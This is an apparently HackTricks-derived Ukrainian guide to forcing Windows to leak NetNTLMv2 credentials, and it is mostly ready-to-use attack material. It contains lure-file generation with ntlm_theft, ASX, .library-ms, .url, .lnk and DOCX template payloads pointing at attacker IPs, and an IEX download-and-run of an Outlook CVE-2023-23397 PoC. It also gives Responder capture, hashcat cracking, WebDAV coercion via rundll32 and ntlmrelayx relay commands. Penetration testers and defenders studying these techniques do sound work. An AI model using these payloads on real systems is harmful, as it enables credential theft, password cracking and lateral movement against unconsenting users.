# Місця для викрадення облікових даних NTLM

{{#include ../../banners/hacktricks-training.md}}

**Перегляньте всі чудові ідеї з [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — від завантаження файла Microsoft Word з інтернету до джерела витоків NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md та [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Доступний для запису SMB share + приманки UNC, що запускаються через Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Якщо ви можете **записувати до share, який користувачі або заплановані завдання переглядають в Explorer**, додайте файли, метадані яких вказують на ваш UNC (наприклад, `\\ATTACKER\share`). Відображення вмісту папки запускає **неявну SMB-автентифікацію** і спричиняє leak **NetNTLMv2** на ваш listener.<sup>[[1]](#references)</sup>

1. **Створіть приманки** (охоплює SCF/URL/LNK/library-ms/desktop.ini/Office/RTF тощо)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Помістіть їх у спільну папку з правом запису** (у будь-яку папку, яку відкриє жертва):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Listen and crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows може одночасно звертатися до кількох файлів; для всього, що Explorer переглядає (`ПЕРЕЙТИ ДО ПАПКИ`), не потрібно нічого натискати.

### Плейлисти Windows Media Player (.ASX/.WAX)

Якщо вдасться змусити ціль відкрити або переглянути створений вами плейлист Windows Media Player, можна викликати leak Net‑NTLMv2, вказавши UNC-шлях для елемента плейлиста. WMP спробує отримати вказаний медіафайл через SMB і пройде автентифікацію неявно.<sup>[[3]](#references)[[4]](#references)</sup>

Приклад payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Процес збору та зламування:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### Вбудований у ZIP .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer ненадійно обробляє файли .library-ms, коли їх відкривають безпосередньо з ZIP-архіву. Якщо визначення бібліотеки вказує на віддалений UNC-шлях (наприклад, \\attacker\share), достатньо переглянути/запустити файл .library-ms у ZIP-архіві, щоб Explorer перебрав UNC-шлях і передав зловмиснику дані автентифікації NTLM. У результаті зловмисник отримує NetNTLMv2, який можна зламати офлайн або потенційно ретранслювати.<sup>[[2]](#references)</sup>

Мінімальний файл .library-ms, що вказує на UNC-шлях зловмисника

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Operational steps
- Створіть файл .library-ms із наведеним вище XML (вкажіть свою IP-адресу/ім’я хоста).
- Заархівуйте його (у Windows: Надіслати → Стиснута ZIP-папка) і передайте ZIP-файл цілі.
- Запустіть listener для перехоплення NTLM і зачекайте, поки жертва відкриє файл .library-ms з ZIP-архіву.


### Звуковий файл нагадування календаря Outlook (CVE-2023-23397) — zero-click витік Net-NTLMv2

Microsoft Outlook для Windows обробляв розширену властивість MAPI PidLidReminderFileParameter в елементах календаря. Якщо ця властивість вказувала на UNC-шлях (наприклад, \\attacker\share\alert.wav), Outlook під час спрацювання нагадування підключався до SMB-ресурсу, спричиняючи витік Net-NTLMv2 користувача без жодного клацання. Цю вразливість виправили 14 березня 2023 року, але вона досі актуальна для застарілих систем і систем без оновлень, а також для ретроспективного реагування на інциденти.<sup>[[5]](#references)</sup>

Швидка експлуатація за допомогою PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

На стороні listener:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Примітки
- Щоб нагадування спрацювало, достатньо, щоб на комп’ютері жертви було запущено Outlook для Windows.
- Результатом leak є Net‑NTLMv2, придатний для офлайн-крекінгу або relay (але не для pass-the-hash).


### .LNK/.URL zero-click leak NTLM на основі іконки (CVE‑2025‑50154 – обхід CVE‑2025‑24054)

Windows Explorer автоматично відображає іконки ярликів. Нещодавні дослідження показали, що навіть після квітневого виправлення Microsoft 2025 року для ярликів з UNC-іконками все ще можна було запустити автентифікацію NTLM без жодного кліку: для цього ціль ярлика розміщували за UNC-шляхом, а іконку залишали локально (обхід виправлення отримав номер CVE‑2025‑50154). Достатньо лише переглянути папку, щоб Explorer отримав метадані від віддаленої цілі та надіслав NTLM на SMB-сервер зловмисника.<sup>[[6]](#references)</sup>

Мінімальне корисне навантаження Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Створення payload для ярлика (.lnk) за допомогою PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Ідеї доставки
- Помістіть ярлик у ZIP-архів і змусьте жертву переглянути його.
- Розмістіть ярлик на доступному для запису спільному ресурсі, який відкриє жертва.
- Додайте до тієї самої папки інші файли-приманки, щоб Провідник показував їх у попередньому перегляді.

### Витік NTLM без кліку через шлях до значка в ExtraData (.LNK) (CVE‑2026‑25185)

Windows завантажує метадані `.lnk` під час **перегляду/попереднього перегляду** (відображення значків), а не лише під час запуску. CVE‑2026‑25185 демонструє шлях обробки, за якого блоки **ExtraData** змушують оболонку визначити шлях до значка й звернутися до файлової системи **під час завантаження**, що спричиняє вихідну автентифікацію NTLM, якщо шлях веде до віддаленого ресурсу.

Ключові умови спрацювання (виявлені в `CShellLink::_LoadFromStream`):
- Додайте **DARWIN_PROPS** (`0xa0000006`) до ExtraData (умова запуску процедури оновлення значка).
- Додайте **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) із заповненим **TargetUnicode**.
- Завантажувач розгортає змінні середовища в `TargetUnicode` і викликає `PathFileExistsW` для отриманого шляху.

Якщо `TargetUnicode` перетворюється на шлях UNC (наприклад, `\\attacker\share\icon.ico`), **простий перегляд папки** з цим ярликом спричиняє вихідну автентифікацію. Той самий шлях завантаження може активуватися під час **індексації** та **сканування антивірусом**, що робить його практичною поверхнею для витоку без кліку.<sup>[[7]](#references)</sup>

Інструменти для досліджень (парсер/генератор/інтерфейс) доступні в проєкті **LnkMeMaybe** для створення та перевірки цих структур без використання графічного інтерфейсу Windows.<sup>[[8]](#references)</sup>


### Примусова автентифікація WebDAV / перевірка облікових даних через `davclnt.dll,DavSetCookie`

Вбудований **клієнт WebDAV** можна використати, щоб змусити поточний сеанс входу автентифікуватися на довільній кінцевій точці **HTTP/WebDAV**:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Чим це корисно:
- Проти **контрольованого зловмисником WebDAV-сервера** це може ініціювати **NTLM через HTTP**, не розміщуючи власний клієнт.
- Проти **внутрішніх хостів** це дає змогу непомітно **перевірити, де приймаються викрадені облікові дані**, перш ніж переходити до lateral movement.<sup>[[9]](#references)</sup>
- Ця команда — хороша альтернатива, коли **вихідний трафік SMB фільтрується**, але **HTTP/WebDAV** іще доступний.

Операційні примітки:
- На вихідному хості має бути запущена служба **WebClient**.
- `rundll32.exe` завантажує `davclnt.dll` і доручає Windows виконати автентифікацію WebDAV із використанням **облікових даних поточного користувача**.<sup>[[10]](#references)</sup>
- Якщо ви вказуєте інфраструктуру, яку контролюєте, використовуйте HTTP listener/relay із підтримкою NTLM, наприклад:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

З погляду виявлення, повторні запуски `rundll32.exe davclnt.dll,DavSetCookie` проти багатьох внутрішніх систем — це сильна ознака **перевірки облікових даних / підготовки до lateral movement на кшталт password spray**, а не звичайної поведінки користувача.<sup>[[9]](#references)[[11]](#references)</sup>

### Віддалена ін'єкція шаблону Office (.docx/.dotm) для примусового використання NTLM

Документи Office можуть посилатися на зовнішній шаблон. Якщо вказати UNC-шлях як приєднаний шаблон, під час відкриття документа відбудеться автентифікація через SMB.

Мінімальні зміни у зв’язках DOCX (всередині word/):

1) Відредагуйте word/settings.xml і додайте посилання на приєднаний шаблон:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Відредагуйте word/_rels/settings.xml.rels і вкажіть свій UNC для rId1337:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Перепакуйте у .docx і доставте. Запустіть свій SMB capture listener і дочекайтеся, поки файл відкриють.

Щоб дізнатися про ідеї post-capture щодо relay або зловживання NTLM, див.:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Пастки зі спільним ресурсом із правом запису + перехоплення Responder → злам NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – витік автентифікації через ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 до DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — витік NTLM через WMP → NTFS junction до webroot RCE → FullPowers + GodPotato до SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 вразливостей NTLM: невиправлені загрози підвищення привілеїв у Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft усуває Outlook EoP (CVE‑2023‑23397) і пояснює витік NTLM через PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, один NTLM: обхід виправлення безпеки Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: огляд CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Інструментарій TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Коли телефонує IT-підтримка: розбір кампанії ModeloRAT — від Teams до компрометації домену](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – заголовковий файл davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – запит Windows Rundll32 через WebDAV](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Цікаві місця для викрадення хешів Netntlm](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
